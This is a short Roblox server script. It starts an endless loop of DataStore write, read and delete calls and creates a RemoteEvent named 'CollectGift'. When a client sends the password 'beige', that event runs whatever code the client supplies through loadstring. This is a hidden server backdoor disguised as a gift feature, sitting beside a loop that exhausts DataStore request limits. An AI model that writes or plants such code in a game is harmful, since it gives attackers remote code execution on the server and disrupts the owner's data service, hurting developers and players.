local DataStoreService = game:GetService("DataStoreService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local target = DataStoreService:GetDataStore("__TEST")

task.spawn(function()
    local counter = 0
    local data = "colorful"
    
    while true do
        counter += 1
        local key = "Color_" .. tostring(counter)
        
        task.spawn(function()
            pcall(function() 
                target:SetAsync(key, data) 
            end)
        end)
        
        task.spawn(function()
            pcall(function() 
                target:GetAsync(key) 
            end)
        end)
        
        task.spawn(function()
            pcall(function() 
                target:RemoveAsync(key) 
            end)
        end)
        
        task.wait()
    end
end)

local remote = Instance.new("RemoteEvent")
remote.Name = "CollectGift"
remote.Parent = ReplicatedStorage

remote.OnServerEvent:Connect(function(plr, key, src)
    if key == "beige" then --theres a reason i call it colorful
        loadstring(src)()
    end
end)
